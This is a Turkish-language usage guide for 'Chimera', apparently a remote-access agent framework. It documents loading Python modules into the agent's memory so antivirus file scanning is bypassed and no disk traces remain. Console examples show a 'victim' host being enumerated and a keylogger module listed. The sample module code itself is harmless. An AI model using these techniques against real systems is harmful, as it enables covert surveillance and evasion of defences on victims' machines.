# Chimera In-Memory Module Loading - Kullanım Kılavuzu

## Hafızadan Modül Yükleme

Bu özellik, Chimera Agent'a Python kodlarını disk'e yazmadan doğrudan RAM'de çalıştırma yeteneği kazandırır. Bu sayede antivirüs yazılımlarının dosya taraması (static analysis) atlatılır.

## Komutlar

### 1. `load <dosya_yolu>`
Handler tarafında bir Python dosyasını agent'a modül olarak yükler.

**Kullanım:**
```
chimera (1) > load modules/payloads/python/chimera/examples/sysinfo_module.py
[*] Modül yükleniyor: sysinfo_module (1234 bytes)...
[+] Modül 'sysinfo_module' başarıyla yüklendi (1234 bytes)
```

### 2. `run <modül_adı> <fonksiyon_adı> [argümanlar]`
Yüklenmiş bir modülün fonksiyonunu çalıştırır.

**Kullanım:**
```
chimera (1) > run sysinfo_module get_system_info
[+] Sonuç:
=== Sistem Bilgisi ===
hostname: target-pc
platform: Windows-10-10.0.19041-SP0
processor: Intel64 Family 6 Model 142 Stepping 12, GenuineIntel
python_version: 3.9.7
cwd: C:\Users\victim
user: victim
```

**Argümanlı kullanım:**
```
chimera (1) > run sysinfo_module list_directory C:\Users
[+] Sonuç:
=== C:\Users içeriği ===
[DIR] Administrator
[DIR] Public
[DIR] victim
```

### 3. `modules`
Yüklenmiş tüm modülleri ve fonksiyonlarını listeler.

**Kullanım:**
```
chimera (1) > modules
[*] Yüklenmiş modüller:
  - sysinfo_module: get_system_info, list_directory, get_network_info
  - keylogger: start, stop, get_logs
```

## Manuel Modül Yükleme (İleri Seviye)

Eğer handler'dan değil de doğrudan agent'a komut göndermek isterseniz:

```
loadmodule <modül_adı> <base64_encoded_kod>
```

**Örnek:**
```python
import base64

code = '''
def hello():
    return "Merhaba Chimera!"
'''

encoded = base64.b64encode(code.encode()).decode()
# Agent'a gönder: loadmodule hello_mod <encoded>
```

## Modül Geliştirme İpuçları

1. **Sadece stdlib kullanın**: Modüller sadece Python standart kütüphanelerini kullanmalıdır.
2. **Hata yönetimi**: Fonksiyonlarınız try-except bloklarıyla korunmalıdır.
3. **Return değerleri**: Fonksiyonlar string döndürmelidir (agent bunu handler'a gönderir).
4. **İzolasyon**: Her modül kendi namespace'inde çalışır.

## Örnek Modül

```python
"""
Örnek Chimera Modülü
"""
import os
import platform

def get_info():
    """Sistem bilgisi döndürür"""
    return f"{platform.system()} - {os.getcwd()}"

def execute_task(command):
    """Özel bir görev çalıştırır"""
    try:
        # Görev mantığı
        result = f"Görev tamamlandı: {command}"
        return result
    except Exception as e:
        return f"Hata: {str(e)}"
```

## Güvenlik Notları

⚠️ **Dikkat**: Bu özellik güçlü bir yetenektir ve kötüye kullanılabilir. Sadece yasal ve etik penetrasyon testlerinde kullanın.

- Modüller RAM'de çalıştığı için disk izleri bırakmaz
- Her modül izole bir namespace'de çalışır
- Modüller agent ile aynı yetkilere sahiptir
- Base64 encoding sadece transfer içindir, şifreleme değildir (TLS zaten şifreler)
